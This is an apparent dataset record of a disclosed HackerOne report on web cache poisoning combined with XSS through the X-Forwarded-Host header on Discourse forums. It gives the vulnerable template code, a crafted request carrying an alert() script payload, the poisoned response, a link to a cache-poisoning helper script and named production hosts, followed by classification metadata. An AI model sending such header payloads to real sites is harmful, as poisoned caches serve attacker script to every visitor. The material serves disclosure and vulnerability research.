{
  "reported_to": "Discourse",
  "reported_by": "bobrov ",
  "title": "Web Cache Deception Attack (XSS)",
  "content": "\nThis XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.\nList of vulnerable hosts:\nCode 106 Bytes\n1discourse.mozilla.org\n2forum.learning.mozilla.org\n3forum.glasswire.com\n4help.nextcloud.com\n5meta.discourse.org\nDescription XSS\nThe Web application is vulnerable to XSS through the X-Forwarded-Host header.\nVulnerable code\nhttps://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\nCode 234 Bytes\n1<% woff2_url = \"#{asset_path(\"fontawesome-webfont.woff2\")}?#{font_domain}&v=4.7.0\".html_safe %>\n2\n3<link rel=\"preload\" href=\"<%=woff2_url%>\" as=\"font\" type=\"font/woff2\" crossorigin />\n4...\n5    src: url('<%=woff2_url %>') format('woff2'),\nHTTP Request\nCode 114 Bytes\n1GET /?xx HTTP/1.1\n2Host: meta.discourse.org\n3X-Forwarded-Host: cacheattack'\"><script>alert(document.domain)</script>\nHTTP Response\nCode 875 Bytes\n1<link rel=\"preload\" \n2   href=\"https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\">\n3   <script>alert(document.domain)</script>\n4   &2&v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin />\n5<style>\n6  @font-face {\n7    font-family: 'FontAwesome';\n8    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\">\n9    <script>alert(document.domain)</script>\n10    &2&v=4.7.0') format('woff2'),\n11         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack&#39;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;2&v=4.7.0') format('woff');\n12  }\n13</style>\nWeb Cache Deception\nAlso, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:\nRequest Start Line, Accept, Accept-Encoding.\nSteps To Reproduce\nFor a simpler demonstration, I wrote a script.\nThe script takes the necessary headers from the request and poisons the cache.\nYou just need to open the cached page.\n1) Open URL\nCode 166 Bytes\n1https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60\n2) Open the cached URL that the script displays.\n3) Result\n<image_0>\nImpact\nAttacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.\nThe impact is like a stored XSS on any page.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 256,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6AMDQAYR%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T154341Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC9emtKCGl3LVIFbG%2B3jG1Rjca5KmItcFh3oaiMbmZC8AiEAmXShTftowUsXM92tfhfsvvmExMoCpbL9KT%2BSNY2GU88qsgUILBADGgwwMTM2MTkyNzQ4NDkiDOOGJh%2BEIo99M2RCJSqPBbK2pvxlHqPEauvRPoQyNZEQ4H%2Ba3Ie9y3SnyX9pieR36RxoZfabXEtIVEswY3vTHkj8Q7ieAXXcw%2B%2BnNCX55dHODar%2BuWi9r5d7otgd5%2FycSJgB0TnzTx7T17HIwatlYixqZOoSAyALjjwuMctsmh3PUr6UFrVnAgGueCU8gB%2Fpx9Qa5LJIs3G7WohtI6Z73OaTe0END%2FV23TCcmXRSv0dzQbPJlP8PzaEYJ6Xj%2BMNTibIE0RAtDPVEdsf%2BClxdxEAXOlZ6fRNRJWtDeIX%2BIZqmriUmUKUI9s%2FaEkNZNdOPRlZK5sfBwaZsC4cSzo4XlNPYnFjj3n8bTPv7npYRChy3hnG%2FWUaE6vaNaZPYml1t%2FArdf6JWs57fYUICe3ZF%2Fg9FtxRcOmBi0dGUux8ndjYGOrIxJnuqy7rPnZgTEDkmTVtYpxVvZoynEcZWbW9deEEwcYWt3UWbPjgSkAKTomgzuTv4RvyGITDlw1nmDVaGYPlq%2FEDUbLt1X2p6HFl8wFqnwzn7ucCBKo9w8Aqs%2BjBpzUnC1s8jcpwNlQlh%2F8F2%2FY9%2B2UC8P50XjSFDUDsAOZq0%2FenZShNiXXbx63X6qyuetNLg9Bo%2BMvh9%2FGr0Q329kLQjQtEEG5uvbRAIKlaH1da%2BtK4BaY8wxlwV2ppJsoyP1L2qh%2FE%2BCWaad9bX%2FWsYIPeZhuKyT%2B82CuHX3LQrrth1LO%2Fz3j24kBtakVnEl4HiMsDaqH89ZSESUQV7MLz60YgQ%2FNxlQSsY9P2CoLQMGzoWllGCFi%2FpgG8Ukwluimqw5ZkXGLvUCqLIWkpXi%2Fju7Vciz2HcPGuuUjY6ps%2BrCn7jPdMNfo4bfScqzQor%2Fco4bc%2B4c%2BabcEp1dsRU464wkrqPvwY6sQEmavGxF5tFpwHLIGs0CBHEXWQKRETlXVPhRS57cU0g7YRRegT05iB%2F26LgQK%2FpskGmjOSO6gK9M52SrHIUy4KekILfOC0MhOEvvuTKqWbSegECfsIvWfKs0bDeu0SyBTKNJu03jrG73z64QHXDbaBmIAdYXxUJrjHhhP2vGwoJfI7r5R0Av7pfHKndshfjn5UM7Ufz7OYwl%2BkU6ihDFiTUm7YJ7G9ucTyDUZZquVak%2Bo4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac005355afdfe105d939c07a1e8ed4cd71f1c1e0531723aa30e560541c01e60d"
  },
  "disclosed_date": 1542542940,
  "report_url": "https://hackerone.com/reports/394016",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a crafted HTTP request with a malicious X-Forwarded-Host header to a vulnerable Discourse instance, e.g., GET /?xx HTTP/1.1 Host: meta.discourse.org X-Forwarded-Host: cacheattack'\"<script>alert(document.domain)</script>"
    ],
    [
      2,
      "The response will include the malicious script in the font URL parameter, which will be cached for 1 minute. Any user accessing the same URL with matching headers will receive the cached XSS payload."
    ]
  ],
  "vuln_description": "The vulnerability is a Web Cache Deception attack leading to XSS via the X-Forwarded-Host header. The application improperly includes the header value in a font URL without proper sanitization, allowing script injection. The response is then cached, serving the malicious payload to other users.",
  "reason": "The attack requires understanding of HTTP header manipulation, cache behavior, and XSS injection points. While the components are standard web security concepts, the interaction between cache poisoning and XSS via font URLs is non-obvious and requires specific knowledge of Discourse's implementation.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The XSS vulnerability is introduced through the X-Forwarded-Host header, which is not part of the normal user navigation flow. The methodology described focuses on swapping user sessions and resource IDs within the same application context, not on manipulating HTTP headers to inject malicious scripts.",
    "is_detectable": false
  }
}